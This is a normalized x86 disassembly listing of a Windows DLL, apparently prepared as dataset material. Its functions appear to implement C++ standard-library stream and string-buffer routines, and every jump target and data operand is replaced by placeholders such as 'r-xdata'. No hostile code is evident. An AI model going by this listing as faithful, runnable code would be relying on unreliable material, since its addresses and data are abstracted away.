jne r-xdata
push ebx
push edi
mov edi [ ecx + 0x30 ]
mov ebx [ edi ]
mov eax esi
lea ebx [ eax + ebx * 2 ]
cmp eax ebx
jae r-xdata
mov eax 0xffff
pop esi
retn
test [ ecx + 0x40 ] 0x4
jne r-xdata
mov ax [ esi ]
pop edi
pop ebx
pop esi
retn
pop edi
pop ebx
mov eax 0xffff
pop esi
retn
mov eax [ ecx + 0x24 ]
mov eax [ eax ]
test eax eax
je r-xdata
cmp eax esi
ja r-xdata
cmp [ ecx + 0x3c ] eax
jae r-xdata
cmp [ ecx + 0x3c ] esi
jbe r-xdata
mov eax [ ecx + 0x3c ]
mov edx [ edx ]
sub eax edx
sar eax 0x1
mov [ edi ] eax
mov ecx [ ecx + 0x20 ]
mov eax [ ecx ]
mov ax [ eax ]
pop edi
pop ebx
pop esi
retn
mov [ ecx + 0x3c ] eax
sub_100042e0
push ebp
mov ebp esp
push ecx
mov edx [ ecx + 0x24 ]
mov eax [ edx ]
test eax eax
je r-xdata
push ebx
mov bl [ ebp + 0x18 ]
push esi
push edi
test bl 0x1
je r-xdata
cmp [ ecx + 0x3c ] eax
jae r-xdata
test bl 0x2
je r-xdata
mov eax [ ecx + 0x20 ]
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
test eax eax
je r-xdata
mov [ ecx + 0x3c ] eax
mov edi [ ebp + 0xc ]
mov ebx [ ebp + 0x10 ]
mov eax edi
or eax ebx
je r-xdata
mov eax [ edx ]
mov [ ebp + 0x18 ] eax
test eax eax
je r-xdata
mov edx [ ebp + 0x14 ]
cmp edx 0x2
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] edi
pop edi
xor ecx ecx
pop esi
mov [ eax + 0x4 ] ebx
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
mov [ eax + 0x10 ] ecx
pop ebx
mov esp ebp
pop ebp
retn 0x14
mov edi [ r--data ]
mov ebx [ r--data ]
mov edx [ ebp + 0x14 ]
cmp edx 0x2
jne r-xdata
cmp edx 0x1
jne r-xdata
mov edx [ ecx + 0x10 ]
mov eax [ ecx + 0x3c ]
sub eax [ edx ]
mov edi [ ebp + 0xc ]
mov ebx [ ebp + 0x10 ]
sar eax 0x1
cdq
add edi eax
adc ebx edx
jmp r-xdata
cmp edx 0x1
jne r-xdata
mov edx [ ecx + 0x10 ]
mov eax [ ecx + 0x3c ]
sub eax [ edx ]
mov edi [ ebp + 0xc ]
mov ebx [ ebp + 0x10 ]
sar eax 0x1
cdq
add edi eax
adc ebx edx
jmp r-xdata
test edx edx
je r-xdata
test bl 0x2
jne r-xdata
test ebx ebx
jl r-xdata
test edx edx
je r-xdata
mov edx [ ecx + 0x10 ]
sub eax [ edx ]
mov edi [ ebp + 0xc ]
mov ebx [ ebp + 0x10 ]
sar eax 0x1
cdq
add edi eax
adc ebx edx
jmp r-xdata
test ebx ebx
jl r-xdata
mov ebx [ ebp + 0x10 ]
mov edi [ ebp + 0xc ]
mov edi [ r--data ]
mov ebx [ r--data ]
jmp r-xdata
mov edx [ ecx + 0x10 ]
sub eax [ edx ]
mov edi [ ebp + 0xc ]
mov ebx [ ebp + 0x10 ]
sar eax 0x1
cdq
add edi eax
adc ebx edx
jmp r-xdata
jg r-xdata
mov ebx [ ebp + 0x10 ]
mov edi [ ebp + 0xc ]
mov edi [ r--data ]
mov ebx [ r--data ]
jmp r-xdata
jg r-xdata
mov eax [ ecx + 0x10 ]
mov esi [ eax ]
mov eax [ ecx + 0x3c ]
sub eax esi
sar eax 0x1
cdq
cmp ebx edx
jg r-xdata
test edi edi
jb r-xdata
mov eax [ ecx + 0x10 ]
mov esi [ eax ]
mov eax [ ecx + 0x3c ]
sub eax esi
sar eax 0x1
cdq
cmp ebx edx
jg r-xdata
test edi edi
jb r-xdata
jl r-xdata
jl r-xdata
sub esi [ ebp - 0x4 ]
mov eax [ ecx + 0x30 ]
sar esi 0x1
add esi edi
sub [ eax ] esi
mov eax [ ecx + 0x20 ]
lea edx [ esi + esi ]
add [ eax ] edx
test [ ebp + 0x18 ] 0x2
je r-xdata
cmp edi eax
ja r-xdata
sub esi [ ebp + 0x18 ]
mov eax [ ecx + 0x34 ]
sar esi 0x1
add esi edi
sub [ eax ] esi
mov ecx [ ecx + 0x24 ]
lea edx [ esi + esi ]
add [ ecx ] edx
jmp r-xdata
cmp edi eax
ja r-xdata
mov eax [ ecx + 0x24 ]
mov eax [ eax ]
test eax eax
je r-xdata
mov esi [ ecx + 0x34 ]
mov edx [ ecx + 0x20 ]
mov esi [ esi ]
mov edx [ edx ]
lea eax [ eax + esi * 2 ]
mov esi [ ecx + 0x24 ]
mov [ esi ] edx
mov ecx [ ecx + 0x34 ]
sub eax edx
sar eax 0x1
mov [ ecx ] eax
jmp r-xdata
sub_100044c0
push ebp
mov ebp esp
and esp 0xfffffff8
push ecx
mov eax [ ebp + 0x14 ]
push ebx
cdq
push esi
mov esi [ ecx + 0x24 ]
push edi
mov edi eax
add edi [ ebp + 0xc ]
mov eax [ esi ]
mov ebx edx
adc ebx [ ebp + 0x10 ]
test eax eax
je r-xdata
mov edx [ r--data ]
cmp edi edx
jne r-xdata
cmp [ ecx + 0x3c ] eax
jae r-xdata
test [ ebp + 0x24 ] 0x1
je r-xdata
cmp ebx [ r--data ]
je r-xdata
mov [ ecx + 0x3c ] eax
test [ ebp + 0x24 ] 0x2
je r-xdata
mov eax [ ecx + 0x20 ]
mov eax [ eax ]
mov [ esp + 0xc ] eax
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] edi
pop edi
xor ecx ecx
pop esi
mov [ eax + 0x4 ] ebx
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
mov [ eax + 0x10 ] ecx
pop ebx
mov esp ebp
pop ebp
retn 0x20
mov ebx [ r--data ]
mov edi edx
mov esi [ esi ]
mov [ esp + 0xc ] esi
test esi esi
je r-xdata
test ebx ebx
jl r-xdata
test ebx ebx
jl r-xdata
jg r-xdata
jg r-xdata
mov edx [ ecx + 0x10 ]
mov esi [ edx ]
mov eax [ ecx + 0x3c ]
sub eax esi
sar eax 0x1
cdq
cmp ebx edx
jg r-xdata
test edi edi
jb r-xdata
mov edx [ ecx + 0x10 ]
mov esi [ edx ]
mov eax [ ecx + 0x3c ]
sub eax esi
sar eax 0x1
cdq
cmp ebx edx
jg r-xdata
test edi edi
jb r-xdata
mov edx [ r--data ]
jl r-xdata
jl r-xdata
sub esi [ esp + 0xc ]
mov eax [ ecx + 0x30 ]
sar esi 0x1
add esi edi
sub [ eax ] esi
mov eax [ ecx + 0x20 ]
lea edx [ esi + esi ]
add [ eax ] edx
test [ ebp + 0x24 ] 0x2
je r-xdata
cmp edi eax
ja r-xdata
sub esi [ esp + 0xc ]
mov eax [ ecx + 0x34 ]
sar esi 0x1
add esi edi
sub [ eax ] esi
mov ecx [ ecx + 0x24 ]
lea eax [ esi + esi ]
add [ ecx ] eax
jmp r-xdata
cmp edi eax
ja r-xdata
mov eax [ ecx + 0x24 ]
mov eax [ eax ]
test eax eax
je r-xdata
mov esi [ ecx + 0x34 ]
mov edx [ ecx + 0x20 ]
mov esi [ esi ]
mov edx [ edx ]
lea eax [ eax + esi * 2 ]
mov esi [ ecx + 0x24 ]
mov [ esi ] edx
mov ecx [ ecx + 0x34 ]
sub eax edx
sar eax 0x1
mov [ ecx ] eax
jmp r-xdata
sub_10004600
push ebp
mov ebp esp
push esi
lea esi [ ecx - 0x8 ]
mov ecx [ esi ]
mov edx [ ecx + 0x4 ]
lea eax [ esi + 0x8 ]
mov [ edx + eax - 0x8 ] r--data
push eax
mov [ eax ] r--data
call sub_10015fc5
add esp 0x4
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_100173b1
add esp 0x4
sub_10004640
push ebp
mov ebp esp
push esi
lea esi [ ecx - 0x10 ]
mov ecx [ esi ]
mov edx [ ecx + 0x4 ]
lea eax [ esi + 0x10 ]
mov [ edx + eax - 0x10 ] r--data
push eax
mov [ eax ] r--data
call sub_10015fc5
add esp 0x4
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_100173b1
add esp 0x4
sub_10004680
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_100039b0
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_100173b1
add esp 0x4
sub_100046b0
push ebp
mov ebp esp
push esi
lea esi [ ecx - 0x60 ]
mov ecx esi
call sub_10003850
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_100173b1
add esp 0x4
sub_100046e0
push ebp
mov ebp esp
push esi
lea esi [ ecx - 0x18 ]
mov ecx [ esi ]
mov edx [ ecx + 0x4 ]
lea eax [ esi + 0x18 ]
mov [ edx + eax - 0x18 ] r--data
mov ecx [ eax - 0x8 ]
mov edx [ ecx + 0x4 ]
mov [ edx + eax - 0x8 ] r--data
mov ecx [ eax - 0x18 ]
mov edx [ ecx + 0x4 ]
mov [ edx + eax - 0x18 ] r--data
push eax
mov [ eax ] r--data
call sub_10015fc5
add esp 0x4
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_100173b1
add esp 0x4
sub_10004740
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_10003fa0
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_100173b1
add esp 0x4
sub_10004770
push ebp
mov ebp esp
push 0xffffffff
push sub_10028b78
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi [ ebp + 0x8 ]
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
mov eax [ ecx + esi + 0xc ]
add ecx esi
test eax eax
jne r-xdata
mov eax [ ecx + 0xc ]
or eax 0x2
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov ecx [ ecx + 0x3c ]
test ecx ecx
je r-xdata
push 0x0
call sub_100033b0
xor al al
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
or eax 0x4
cmp [ ebp + 0xc ] 0x0
jne r-xdata
call sub_10003920
mov edx [ esi ]
mov ecx [ edx + 0x4 ]
add ecx esi
cmp [ ecx + 0xc ] 0x0
jne r-xdata
mov eax [ esi ]
mov edx [ eax + 0x4 ]
mov ecx [ edx + esi + 0x14 ]
test cl 0x1
je r-xdata
mov al 0x1
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
lea eax [ esi + edx ]
lea edi [ ebp + 0xc ]
call sub_100034b0
mov edi eax
mov [ ebp - 0x4 ] 0x0
call sub_10004c90
lea ecx [ ebp + 0xc ]
mov edi eax
call sub_10002ec0
mov [ ebp - 0x4 ] 0x1
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
mov ecx [ ecx + esi + 0x38 ]
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ecx ]
mov edx [ eax + 0x18 ]
call edx
movzx eax ax
mov edx [ ecx + 0x30 ]
cmp [ edx ] 0x0
jle r-xdata
mov edx [ edi ]
push eax
mov eax [ edx + 0x8 ]
push 0x48
mov ecx edi
call eax
test al al
jne r-xdata
mov edx [ esi ]
mov ecx [ edx + 0x4 ]
mov eax [ ecx + esi + 0xc ]
add ecx esi
or eax 0x1
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov eax [ eax ]
movzx eax [ eax ]
jmp r-xdata
mov ecx [ esi ]
mov edx [ ecx + 0x4 ]
mov eax [ edx + esi + 0x38 ]
call sub_10003a30
jmp r-xdata
mov [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
push 0x0
call sub_100033b0
mov [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
or eax 0x4
movzx eax ax
mov ecx 0xffff
cmp cx ax
jne r-xdata
sub_10004888
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov ecx [ ecx + 0x4 ]
add ecx eax
mov eax [ ecx + 0xc ]
or eax 0x4
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
push 0x1
call sub_100033b0
mov [ ebp - 0x4 ] 0xffffffff
mov eax r-xdata
retn
or eax 0x4
sub_10004950
push ebp
mov ebp esp
push 0xffffffff
push sub_10028fdb
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi [ ebp + 0x8 ]
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov eax [ edi ]
mov ecx [ eax + 0x4 ]
mov [ edi + ecx ] r--data
mov edx [ edi ]
mov [ edi + 0x8 ] ebx
mov [ edi + 0xc ] ebx
mov esi [ edx + 0x4 ]
add esi edi
call sub_100034f0
mov eax [ ebp + 0xc ]
push esi
mov [ esi + 0x38 ] eax
mov [ esi + 0x3c ] ebx
call sub_10004be0
mov [ esi + 0x40 ] ax
cmp [ esi + 0x38 ] ebx
jne r-xdata
mov ecx [ edi + 0x10 ]
mov edx [ ecx + 0x4 ]
mov [ edi + edx + 0x10 ] r--data
mov eax [ edi ]
mov ecx [ eax + 0x4 ]
mov [ edi + ecx ] r--data
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ esi + 0xc ]
or eax 0x4
or eax 0x4
push ebx
mov ecx esi
call sub_100033b0
sub_10004a00
push ebp
mov ebp esp
push 0xffffffff
push sub_100285eb
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
lea ecx [ esi + 0x4 ]
mov [ esi ] r--data
call sub_100163f8
push 0x4
mov [ ebp - 0x4 ] 0x0
call sub_1001740d
mov edi eax
add esp 0x4
test edi edi
je r-xdata
xor edi edi
call sub_100162d0
mov [ edi ] eax
call sub_1001608f
push 0x0
lea ecx [ ebp - 0x10 ]
mov ebx eax
call sub_100163b9
mov eax [ ebx + 0x4 ]
cmp eax 0xffffffff
jae r-xdata
lea ecx [ ebp - 0x10 ]
call sub_100163e1
jmp r-xdata
inc eax
mov [ ebx + 0x4 ] eax
lea eax [ esi + 0x8 ]
mov [ esi + 0x10 ] eax
lea ecx [ esi + 0x18 ]
mov [ esi + 0x20 ] ecx
lea edx [ esi + 0x1c ]
mov [ esi + 0x24 ] edx
mov [ esi + 0x38 ] edi
lea eax [ esi + 0xc ]
mov [ esi + 0x14 ] eax
lea ecx [ esi + 0x28 ]
mov [ esi + 0x30 ] ecx
lea edx [ esi + 0x2c ]
mov [ esi + 0x34 ] edx
mov [ eax ] 0x0
mov eax [ esi + 0x24 ]
mov [ eax ] 0x0
mov ecx [ esi + 0x34 ]
mov [ ecx ] 0x0
mov edx [ esi + 0x10 ]
mov [ edx ] 0x0
mov eax [ esi + 0x20 ]
mov [ eax ] 0x0
mov ecx [ esi + 0x30 ]
mov [ ecx ] 0x0
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_10004af0
push ebp
mov ebp esp
sub esp 0xc
push ebx
mov ebx eax
mov eax [ esi + 0x40 ]
and eax 0x6
cmp al 0x6
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn 0x4
push edi
xor edi edi
test ebx ebx
je r-xdata
mov edx [ ebp + 0x8 ]
add ebx ebx
push ebx
push edx
push edi
call sub_100183c0
add esp 0xc
test [ esi + 0x40 ] 0x4
lea eax [ ebx + edi ]
mov [ esi + 0x3c ] eax
jne r-xdata
cmp ebx 0x7fffffff
ja r-xdata
mov ecx [ esi + 0x40 ]
test cl 0x2
jne r-xdata
mov ecx [ esi + 0x10 ]
mov [ ecx ] edi
mov edx [ esi + 0x20 ]
mov [ edx ] edi
mov edx [ esi + 0x30 ]
mov ecx ebx
sar ecx 0x1
mov [ edx ] ecx
lea edx [ ebp + 0x8 ]
push edx
lea ecx [ ebp - 0xc ]
mov [ ebp + 0x8 ] 0x0
call sub_10016f5a
push r--data
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0xc ] r--data
call sub_10017df7
int3
lea ecx [ ebx + ebx ]
push ecx
call sub_1001740d
mov edi eax
add esp 0x4
test edi edi
je r-xdata
or [ esi + 0x40 ] 0x1
pop edi
test cl 0x10
jne r-xdata
mov ecx [ esi + 0x14 ]
mov [ ecx ] edi
mov edx [ esi + 0x24 ]
sub ebx eax
mov [ edx ] eax
mov eax [ esi + 0x34 ]
add ebx edi
sar ebx 0x1
mov [ eax ] ebx
mov ecx [ esi + 0x20 ]
cmp [ ecx ] 0x0
jne r-xdata
mov eax edi
mov edx [ esi + 0x10 ]
mov [ edx ] edi
mov eax [ esi + 0x20 ]
mov [ eax ] 0x0
mov ecx [ esi + 0x30 ]
sar edi 0x1
mov [ ecx ] edi
sub_10004be0
push ebp
mov ebp esp
push 0xffffffff
push sub_10028968
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
lea edi [ ebp + 0x8 ]
call sub_100034b0
mov edi eax
mov [ ebp - 0x4 ] 0x0
call sub_10004c90
mov [ ebp - 0x4 ] 0xffffffff
mov edi [ ebp + 0x8 ]
mov ebx eax
test edi edi
je r-xdata
mov eax [ ebx ]
mov edx [ eax + 0x28 ]
push 0x20
mov ecx ebx
call edx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
push 0x0
lea ecx [ ebp - 0x10 ]
call sub_100163b9
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
mov esi [ edi + 0x4 ]
neg esi
sbb esi esi
lea ecx [ ebp - 0x10 ]
not esi
call sub_100163e1
and esi edi
je r-xdata
cmp eax 0xffffffff
jae r-xdata
mov eax [ esi ]
mov edx [ eax ]
push 0x1
mov ecx esi
call edx
dec eax
mov [ edi + 0x4 ] eax
sub_10004c90
push ebp
mov ebp esp
push 0xffffffff
push sub_100285b8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x18
push ebx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
push 0x0
lea ecx [ ebp - 0x18 ]
call sub_100163b9
mov [ ebp - 0x4 ] 0x0
cmp [ rw-data ] 0x0
mov ebx [ rw-data ]
mov [ ebp - 0x10 ] ebx
jne r-xdata
mov esi [ rw-data ]
mov eax [ edi ]
cmp esi [ eax + 0xc ]
jae r-xdata
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_100163b9
cmp [ rw-data ] 0x0
jne r-xdata
xor ecx ecx
jmp r-xdata
mov ecx [ eax + 0x8 ]
mov ecx [ ecx + esi * 4 ]
test ecx ecx
jne r-xdata
lea ecx [ ebp - 0x14 ]
call sub_100163e1
mov eax [ rw-data ]
inc eax
mov [ rw-data ] eax
mov [ rw-data ] eax
cmp [ eax + 0x14 ] 0x0
je r-xdata
mov esi ecx
call sub_1001608f
cmp esi [ eax + 0xc ]
jae r-xdata
lea ecx [ ebp - 0x18 ]
mov [ ebp - 0x4 ] 0xffffffff
call sub_100163e1
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
test ebx ebx
je r-xdata
mov edx [ eax + 0x8 ]
mov esi [ edx + esi * 4 ]
jmp r-xdata
lea eax [ ebp - 0x10 ]
push edi
push eax
call sub_10002f90
add esp 0x8
cmp eax 0xffffffff
jne r-xdata
mov esi ebx
jmp r-xdata
test esi esi
jne r-xdata
mov esi [ ebp - 0x10 ]
push 0x0
lea ecx [ ebp - 0x14 ]
mov [ rw-data ] esi
call sub_100163b9
mov eax [ esi + 0x4 ]
cmp eax 0xffffffff
jae r-xdata
push r--data
lea ecx [ ebp - 0x24 ]
call sub_10016fc1
push r--data
lea ecx [ ebp - 0x24 ]
push ecx
call sub_10017df7
lea ecx [ ebp - 0x14 ]
call sub_100163e1
push esi
call sub_10016018
add esp 0x4
inc eax
mov [ esi + 0x4 ] eax
sub_10004dd0
push ebp
mov ebp esp
push ecx
push esi
push edi
push 0x0
push eax
or eax 0xffffffff
mov edi edx
mov esi ecx
mov [ ebp - 0x4 ] 0x0
call sub_10001c20
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov edi eax
mov [ esi ] cx
call sub_10001bb0
pop edi
mov eax esi
pop esi
mov esp ebp
pop ebp
retn
sub_10004e10
push ebp
mov ebp esp
push 0xffffffff
push sub_10028fa8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x2c
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov ebx [ ebp + 0x8 ]
mov eax [ ebx ]
mov ecx [ eax + 0x4 ]
mov ecx [ ecx + ebx + 0x38 ]
xor esi esi
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x11 ] 0x0
mov [ ebp - 0x2c ] ebx
cmp ecx esi
je r-xdata
push esi
push ebx
mov [ ebp - 0x4 ] esi
call sub_10004770
mov [ ebp - 0x28 ] al
mov [ ebp - 0x4 ] 0x1
test al al
je r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x4 ]
call eax
mov edx [ ebx ]
mov eax [ edx + 0x4 ]
xor edi edi
cmp [ ebp - 0x11 ] 0x0
mov [ eax + ebx + 0x20 ] edi
mov [ eax + ebx + 0x24 ] edi
jne r-xdata
mov ecx [ ebx ]
mov eax [ ecx + 0x4 ]
add eax ebx
lea edi [ ebp - 0x1c ]
call sub_100034b0
mov edi eax
mov [ ebp - 0x4 ] 0x2
call sub_10004c90
mov [ ebp - 0x4 ] 0x1
mov esi [ ebp - 0x1c ]
mov [ ebp - 0x24 ] eax
test esi esi
je r-xdata
mov eax [ ebx ]
mov ecx [ eax + 0x4 ]
add ecx ebx
cmp esi edi
je r-xdata
or esi 0x2
mov esi [ ebp + 0xc ]
or eax 0xffffffff
xor ecx ecx
call sub_10002020
mov [ ebp - 0x4 ] 0x3
mov ecx [ ebx ]
mov edx [ ecx + 0x4 ]
mov ecx [ edx + ebx + 0x24 ]
mov eax [ edx + ebx + 0x20 ]
test ecx ecx
jl r-xdata
push 0x0
lea ecx [ ebp - 0x20 ]
call sub_100163b9
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x2c ]
mov ecx [ eax ]
mov edx [ ecx + 0x4 ]
mov ecx [ edx + eax + 0x38 ]
cmp ecx edi
je r-xdata
mov eax [ ecx + 0xc ]
or eax esi
cmp [ ecx + 0x38 ] edi
jne r-xdata
mov esi 0x7ffffffe
jg r-xdata
mov edi [ esi + 0x4 ]
neg edi
sbb edi edi
lea ecx [ ebp - 0x20 ]
not edi
call sub_100163e1
and edi esi
je r-xdata
cmp eax 0xffffffff
jae r-xdata
mov eax ebx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ecx ]
mov edx [ eax + 0x8 ]
call edx
push edi
call sub_100033b0
or eax 0x4
mov eax [ ecx ]
mov edx [ eax + 0x18 ]
call edx
movzx eax ax
mov edx [ ecx + 0x30 ]
cmp [ edx ] 0x0
jle r-xdata
mov [ ebp - 0x34 ] ecx
cmp eax 0x7ffffffe
jae r-xdata
test eax eax
je r-xdata
mov edx [ edi ]
mov eax [ edx ]
push 0x1
mov ecx edi
call eax
dec eax
mov [ esi + 0x4 ] eax
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
mov eax 0xffff
cmp ax di
jne r-xdata
mov eax [ eax ]
movzx eax [ eax ]
jmp r-xdata
mov [ ebp - 0x34 ] ecx
mov esi eax
jmp r-xdata
mov esi [ ebp - 0x18 ]
mov ecx [ ebp - 0x24 ]
mov edx [ ecx ]
mov eax [ edx + 0x8 ]
push edi
push 0x48
call eax
test al al
jne r-xdata
or [ ebp - 0x18 ] 0x1
movzx edi ax
mov ecx [ edx + ebx + 0x38 ]
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
mov ebx edi
mov edi [ ebp + 0xc ]
call sub_10005220
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ecx + 0x4 ]
mov eax [ edx + eax + 0x38 ]
mov [ ebp - 0x11 ] 0x1
dec esi
call sub_10003a30
mov ebx [ ebp + 0x8 ]
movzx eax ax
mov edi eax
jmp r-xdata
test esi esi
je r-xdata
sub_10004f97
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov ecx [ ecx + 0x4 ]
add ecx eax
mov eax [ ecx + 0xc ]
or eax 0x4
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
push 0x1
call sub_100033b0
mov [ ebp - 0x4 ] 0x1
mov eax r-xdata
retn
or eax 0x4
sub_10005040
push ebp
mov ebp esp
push 0xffffffff
push sub_10028f70
mov eax [ fs : 0x0 ]
push eax
sub esp 0x18
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi ecx
mov edi [ ebp + 0x8 ]
mov eax [ edi ]
mov ecx [ eax + 0x4 ]
mov ecx [ ecx + edi + 0x38 ]
xor ebx ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x11 ] bl
mov [ ebp - 0x20 ] edi
test ecx ecx
je r-xdata
push 0x1
push edi
mov [ ebp - 0x4 ] 0x0
call sub_10004770
mov [ ebp - 0x1c ] al
mov [ ebp - 0x4 ] 0x1
test al al
je r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x4 ]
call eax
or ebx 0x2
or eax 0xffffffff
xor ecx ecx
mov [ ebp - 0x4 ] 0x2
call sub_10002020
mov ecx [ edi ]
mov edx [ ecx + 0x4 ]
mov ecx [ edx + edi + 0x38 ]
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x20 ]
mov ecx [ eax ]
mov edx [ ecx + 0x4 ]
mov ecx [ edx + eax + 0x38 ]
test ecx ecx
je r-xdata
mov eax [ ecx + 0xc ]
or eax ebx
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov eax [ ecx ]
mov edx [ eax + 0x18 ]
call edx
movzx eax ax
mov edx [ ecx + 0x30 ]
cmp [ edx ] 0x0
jle r-xdata
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ecx ]
mov edx [ eax + 0x8 ]
call edx
push 0x0
call sub_100033b0
or eax 0x4
mov ecx 0x22
cmp ax cx
jne r-xdata
or ebx 0x1
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
mov eax [ eax ]
movzx eax [ eax ]
jmp r-xdata
cmp [ esi + 0x10 ] 0x7ffffffe
jb r-xdata
mov edx [ edi ]
mov eax [ edx + 0x4 ]
mov ecx [ eax + edi + 0x38 ]
mov edx [ ecx + 0x20 ]
cmp [ edx ] 0x0
mov [ ebp - 0x11 ] 0x1
je r-xdata
cmp [ ebp - 0x11 ] 0x0
jne r-xdata
movzx eax ax
mov ecx 0xffff
cmp cx ax
jne r-xdata
mov ebx eax
mov edi esi
call sub_10005220
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ecx + 0x4 ]
mov eax [ edx + eax + 0x38 ]
mov [ ebp - 0x11 ] 0x1
call sub_10003a30
mov ebx [ ebp - 0x18 ]
mov edi [ ebp + 0x8 ]
jmp r-xdata
or ebx 0x2
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x1c ]
call eax
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
mov eax [ ecx + 0x30 ]
cmp [ eax ] 0x0
jle r-xdata
mov edx [ edi ]
mov ecx [ edx + 0x4 ]
add ecx edi
test ebx ebx
je r-xdata
dec [ eax ]
mov ecx [ ecx + 0x20 ]
add [ ecx ] 0x2
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
sub_1000518d
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov ecx [ ecx + 0x4 ]
add ecx eax
mov eax [ ecx + 0xc ]
or eax 0x4
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
push 0x1
call sub_100033b0
mov [ ebp - 0x4 ] 0x1
mov eax r-xdata
retn
or eax 0x4
sub_10005220
mov eax [ edi + 0x10 ]
or ecx 0xffffffff
sub ecx eax
cmp ecx 0x1
ja r-xdata
push esi
